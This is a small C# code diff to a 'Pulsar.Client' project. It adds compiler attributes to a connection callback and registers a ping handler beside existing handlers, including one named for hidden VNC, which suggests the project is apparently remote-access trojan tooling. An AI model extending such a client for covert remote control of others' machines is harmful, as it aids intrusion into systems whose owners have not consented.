@@ -196,6 +196,9 @@ namespace Pulsar.Client
             }
         }
 
+        [System.Runtime.CompilerServices.MethodImpl(
+    System.Runtime.CompilerServices.MethodImplOptions.NoInlining |
+    System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
         private void ConnectClientOnClientState(Networking.Client s, bool connected)
         {
             if (connected)
@@ -235,6 +238,7 @@ namespace Pulsar.Client
         {
             //preview stuff
             _messageProcessors.Add(new PreviewHandler());
+            _messageProcessors.Add(new PingHandler());
 
             _messageProcessors.Add(new QuickCommandHandler());
             _messageProcessors.Add(new HVNCHandler());
